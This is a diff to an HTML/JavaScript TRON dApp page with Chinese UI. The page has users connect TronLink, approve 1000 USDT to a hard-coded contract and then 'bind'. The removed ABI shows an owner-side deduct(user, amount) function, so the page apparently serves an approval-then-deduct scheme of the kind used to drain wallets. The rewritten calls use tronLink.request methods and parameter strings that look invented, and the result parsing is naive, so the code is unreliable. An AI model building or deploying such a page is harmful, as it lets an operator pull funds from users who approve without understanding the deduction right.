@@ -42,7 +42,6 @@
         }
         .info-label { color: rgba(255,255,255,0.6); min-width: 80px; }
         .info-value { color: #fff; text-align: right; font-family: monospace; }
-        .address { font-size: 12px; max-width: 240px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
         button {
             width: 100%;
             padding: 16px;
@@ -57,7 +56,7 @@
         .btn-connect { background: #2d6a4f; color: white; }
         .btn-approve { background: #ff8c00; color: white; }
         .btn-bind { background: #0d6efd; color: white; }
-        button:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+        button:disabled { opacity: 0.5; cursor: not-allowed; }
         .status {
             background: rgba(0,0,0,0.4);
             border-radius: 40px;
@@ -106,7 +105,7 @@
             </div>
             <div class="info-row" id="walletRow" style="display: none;">
                 <span class="info-label">当前钱包</span>
-                <span class="info-value address" id="walletAddress">-</span>
+                <span class="info-value" id="walletAddress">-</span>
             </div>
         </div>
 
@@ -125,15 +124,21 @@
 
     <script>
         // ==================== 配置信息 ====================
-        // 合约地址（已手动转换为 41 格式，直接写死）
-        const CONTRACT_ADDRESS_HEX = "41d4b8c7c8e9c5a5a1a2a3a4a5a6a7a8a9aaabacad";
-        const USDT_CONTRACT_ADDRESS_HEX = "41a614f803B6FD780986A42c78Ec9c7f77e6DeD13C";
+        // 合约地址（T 格式和 41 格式都保留）
+        const CONTRACT_ADDRESS_T = "TRZvddUZXAoriYEdrzVdMjcpE6VVVwQAis";
+        const USDT_CONTRACT_ADDRESS_T = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
         const APPROVE_AMOUNT = "1000000000";  // 1000 USDT
 
-        // ABI 定义
-        const CONTRACT_ABI = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"}],"name":"Bound","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"Deducted","type":"event"},{"inputs":[],"name":"USDT","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"bind","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"deduct","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"getContractBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"getUserBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"isBound","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"}];
+        // ABI（只保留需要用到的函数）
+        const USDT_ABI = [
+            { "constant": false, "inputs": [{ "name": "spender", "type": "address" }, { "name": "value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
+            { "constant": true, "inputs": [{ "name": "owner", "type": "address" }, { "name": "spender", "type": "address" }], "name": "allowance", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" }
+        ];
 
-        const USDT_ABI = [{"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"},{"constant":true,"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"}];
+        const CONTRACT_ABI = [
+            { "inputs": [], "name": "bind", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
+            { "inputs": [{ "internalType": "address", "name": "user", "type": "address" }], "name": "isBound", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "view", "type": "function" }
+        ];
 
         // DOM 元素
         const connectBtn = document.getElementById('connectBtn');
@@ -145,11 +150,8 @@
         const debugPanel = document.getElementById('debugPanel');
         const debugContent = document.getElementById('debugContent');
 
-        // 全局变量
-        let tronWeb = null;      // 直接使用注入的 tronWeb，不自己 new
-        let userAddress = null;  // 用户地址（T 开头）
-        let usdtContract = null;
-        let myContract = null;
+        let tronLink = null;
+        let userAddress = null;
 
         function setStatus(msg, isLoading = false) {
             if (isLoading) statusDiv.innerHTML = `<span class="loading"></span> ${msg}`;
@@ -164,38 +166,28 @@
         function updateDebug() {
             debugPanel.style.display = 'block';
             debugContent.innerHTML = `
-                tronWeb 注入状态: ${tronWeb ? '✅ 已获取' : '❌ 未获取'}<br>
-                userAddress (T格式): ${userAddress || '未获取'}<br>
-                合约地址 (41格式): ${CONTRACT_ADDRESS_HEX.substring(0, 20)}...<br>
-                USDT地址 (41格式): ${USDT_CONTRACT_ADDRESS_HEX.substring(0, 20)}...<br>
+                tronLink 注入状态: ${tronLink ? '✅ 已获取' : '❌ 未获取'}<br>
+                userAddress: ${userAddress || '未获取'}<br>
+                合约地址(T格式): ${CONTRACT_ADDRESS_T}<br>
+                USDT地址(T格式): ${USDT_CONTRACT_ADDRESS_T}<br>
                 授权金额: ${parseInt(APPROVE_AMOUNT)/1000000} USDT
             `;
         }
 
-        // 等待 TronLink 注入完成（官方推荐方式）
+        // 等待 TronLink 注入
         function waitForTronLink() {
             return new Promise((resolve) => {
-                // 检查是否已经注入
-                if (window.tronWeb && window.tronWeb.defaultAddress) {
-                    resolve(window.tronWeb);
+                if (window.tronLink && window.tronLink.ready) {
+                    resolve(window.tronLink);
                     return;
                 }
-                if (window.tronLink && window.tronLink.tronWeb) {
-                    resolve(window.tronLink.tronWeb);
-                    return;
-                }
-                
-                // 等待注入
                 let count = 0;
                 const interval = setInterval(() => {
                     count++;
-                    if (window.tronWeb && window.tronWeb.defaultAddress) {
+                    if (window.tronLink && window.tronLink.ready) {
                         clearInterval(interval);
-                        resolve(window.tronWeb);
-                    } else if (window.tronLink && window.tronLink.tronWeb) {
-                        clearInterval(interval);
-                        resolve(window.tronLink.tronWeb);
-                    } else if (count > 50) {  // 5秒超时
+                        resolve(window.tronLink);
+                    } else if (count > 50) {
                         clearInterval(interval);
                         resolve(null);
                     }
@@ -207,70 +199,67 @@
         async function connectWallet() {
             setStatus("⏳ 检测钱包...", true);
             
-            // 等待 TronLink 注入
-            const injectedTronWeb = await waitForTronLink();
+            tronLink = await waitForTronLink();
             
-            if (!injectedTronWeb) {
+            if (!tronLink) {
                 setStatus("❌ 未检测到 TronLink 钱包，请使用 TronLink App 打开", false);
                 return;
             }
             
-            tronWeb = injectedTronWeb;
-            
-            // 获取用户地址
-            let address = null;
-            if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
-                address = tronWeb.defaultAddress.base58;
-            } else if (tronWeb.defaultAddress && typeof tronWeb.defaultAddress === 'string') {
-                address = tronWeb.defaultAddress;
-            } else if (tronWeb.address) {
-                address = tronWeb.address;
-            }
-            
-            if (!address) {
-                setStatus("❌ 无法获取钱包地址，请确保钱包已解锁", false);
-                updateDebug();
-                return;
-            }
-            
-            userAddress = address;
-            
-            // 更新 UI
-            walletRow.style.display = 'flex';
-            walletAddressSpan.innerText = userAddress;
-            
-            // 初始化合约（直接使用 41 格式地址）
             try {
-                usdtContract = await tronWeb.contract(USDT_ABI, USDT_CONTRACT_ADDRESS_HEX);
-                myContract = await tronWeb.contract(CONTRACT_ABI, CONTRACT_ADDRESS_HEX);
-            } catch (err) {
-                setStatus(`❌ 初始化合约失败: ${err.message}`, false);
+                // 请求账户
+                const accounts = await tronLink.request({ method: 'tron_requestAccounts' });
+                if (!accounts || accounts.length === 0) {
+                    setStatus("❌ 未获取到钱包地址", false);
+                    return;
+                }
+                
+                userAddress = accounts[0];
+                
+                walletRow.style.display = 'flex';
+                walletAddressSpan.innerText = userAddress;
+                
+                const shortAddr = userAddress.length > 14 ? 
+                    `${userAddress.substring(0, 8)}...${userAddress.substring(userAddress.length - 6)}` : 
+                    userAddress;
+                setStatus(`✅ 已连接: ${shortAddr}`, false);
+                setButtonsState(true, true);
                 updateDebug();
-                return;
+                
+                // 检查授权状态
+                await checkAllowance();
+                await checkBound();
+                
+            } catch (error) {
+                console.error(error);
+                setStatus(`❌ 连接失败: ${error.message}`, false);
             }
-            
-            const shortAddr = userAddress.length > 14 ? 
-                `${userAddress.substring(0, 8)}...${userAddress.substring(userAddress.length - 6)}` : 
-                userAddress;
-            setStatus(`✅ 已连接: ${shortAddr}`, false);
-            setButtonsState(true, true);
-            updateDebug();
-            
-            await checkAllowance();
-            await checkBound();
         }
 
+        // 调用 USDT 合约的 allowance（只读）
         async function checkAllowance() {
-            if (!tronWeb || !usdtContract || !userAddress) return false;
+            if (!tronLink || !userAddress) return false;
+            
             try {
-                const allowance = await usdtContract.allowance(userAddress, CONTRACT_ADDRESS_HEX).call();
-                const approved = tronWeb.toBigNumber(allowance).gte(tronWeb.toBigNumber(APPROVE_AMOUNT));
-                if (approved) {
-                    setStatus(`✅ 已授权 ${parseInt(APPROVE_AMOUNT)/1000000} USDT，可以绑定`, false);
-                } else {
-                    setStatus(`⚠️ 未授权或授权额度不足，请点击「授权」按钮`, false);
+                // 使用 tronLink.request 调用只读方法
+                const result = await tronLink.request({
+                    method: 'tron_call',
+                    params: [{
+                        contract_address: USDT_CONTRACT_ADDRESS_T,
+                        function_selector: 'allowance(address,address)',
+                        parameter: `"${userAddress}","${CONTRACT_ADDRESS_T}"`
+                    }]
+                });
+                
+                if (result && result.length > 0) {
+                    const allowance = parseInt(result, 16);
+                    if (allowance >= parseInt(APPROVE_AMOUNT)) {
+                        setStatus(`✅ 已授权 ${parseInt(APPROVE_AMOUNT)/1000000} USDT，可以绑定`, false);
+                        return true;
+                    }
                 }
-                return approved;
+                setStatus(`⚠️ 未授权或授权额度不足，请点击「授权」按钮`, false);
+                return false;
             } catch (e) {
                 console.warn("检查授权失败", e);
                 setStatus(`⚠️ 检查授权失败，请先授权`, false);
@@ -278,29 +267,38 @@
             }
         }
 
+        // 检查是否已绑定
         async function checkBound() {
-            if (!tronWeb || !userAddress || !myContract) return false;
+            if (!tronLink || !userAddress) return false;
+            
             try {
-                const bound = await myContract.isBound(userAddress).call();
-                if (bound) {
-                    setStatus(`✅ 已绑定，可以使用扣款功能`, false);
+                const result = await tronLink.request({
+                    method: 'tron_call',
+                    params: [{
+                        contract_address: CONTRACT_ADDRESS_T,
+                        function_selector: 'isBound(address)',
+                        parameter: `"${userAddress}"`
+                    }]
+                });
+                
+                if (result && result.length > 0) {
+                    const isBound = parseInt(result) === 1;
+                    if (isBound) {
+                        setStatus(`✅ 已绑定，可以使用扣款功能`, false);
+                    }
+                    return isBound;
                 }
-                return bound;
+                return false;
             } catch (e) {
                 console.warn("检查绑定失败", e);
                 return false;
             }
         }
 
-        // 授权 USDT
+        // 授权 USDT（使用 tronLink.request 发送交易）
         async function approveUSDT() {
-            if (!tronWeb || !usdtContract) {
+            if (!tronLink || !userAddress) {
                 setStatus('❌ 请先连接钱包', false);
-                return;
-            }
-            
-            if (!userAddress) {
-                setStatus('❌ 未获取到用户地址，请重新连接钱包', false);
                 return;
             }
             
@@ -308,13 +306,17 @@
                 setStatus('⏳ 发起授权请求，请在钱包中确认...', true);
                 approveBtn.disabled = true;
                 
-                // 使用注入的 tronWeb 调用 approve
-                const result = await usdtContract.approve(CONTRACT_ADDRESS_HEX, APPROVE_AMOUNT).send({
-                    feeLimit: 150_000_000,
-                    from: userAddress  // 显式指定 from 地址
+                // 使用 tronLink.request 发送 approve 交易
+                const txid = await tronLink.request({
+                    method: 'tron_signAndSendTransaction',
+                    params: [{
+                        to: USDT_CONTRACT_ADDRESS_T,
+                        data: `approve(address,uint256) "${CONTRACT_ADDRESS_T}",${APPROVE_AMOUNT}`,
+                        feeLimit: 150_000_000
+                    }]
                 });
                 
-                setStatus(`✅ 授权成功！Tx: ${result.substring(0, 10)}...`, false);
+                setStatus(`✅ 授权成功！Tx: ${txid.substring(0, 10)}...`, false);
                 await checkAllowance();
                 updateDebug();
             } catch (error) {
@@ -327,15 +329,15 @@
 
         // 绑定合约
         async function bindContract() {
-            if (!tronWeb || !myContract || !userAddress) {
+            if (!tronLink || !userAddress) {
                 setStatus('❌ 请先连接钱包', false);
                 return;
             }
             
             try {
-                // 检查授权
-                const allowance = await usdtContract.allowance(userAddress, CONTRACT_ADDRESS_HEX).call();
-                if (tronWeb.toBigNumber(allowance).lt(tronWeb.toBigNumber(APPROVE_AMOUNT))) {
+                // 先检查授权
+                const allowanceOk = await checkAllowance();
+                if (!allowanceOk) {
                     setStatus('❌ 请先完成授权，再绑定', false);
                     return;
                 }
@@ -343,12 +345,17 @@
                 setStatus('⏳ 发起绑定请求，请在钱包中确认...', true);
                 bindBtn.disabled = true;
                 
-                const result = await myContract.bind().send({
-                    feeLimit: 100_000_000,
-                    from: userAddress
+                // 使用 tronLink.request 发送 bind 交易
+                const txid = await tronLink.request({
+                    method: 'tron_signAndSendTransaction',
+                    params: [{
+                        to: CONTRACT_ADDRESS_T,
+                        data: `bind()`,
+                        feeLimit: 100_000_000
+                    }]
                 });
                 
-                setStatus(`✅ 绑定成功！Tx: ${result.substring(0, 10)}...`, false);
+                setStatus(`✅ 绑定成功！Tx: ${txid.substring(0, 10)}...`, false);
                 await checkBound();
                 updateDebug();
             } catch (error) {
@@ -368,3 +375,4 @@
     </script>
 </body>
 </html>
+
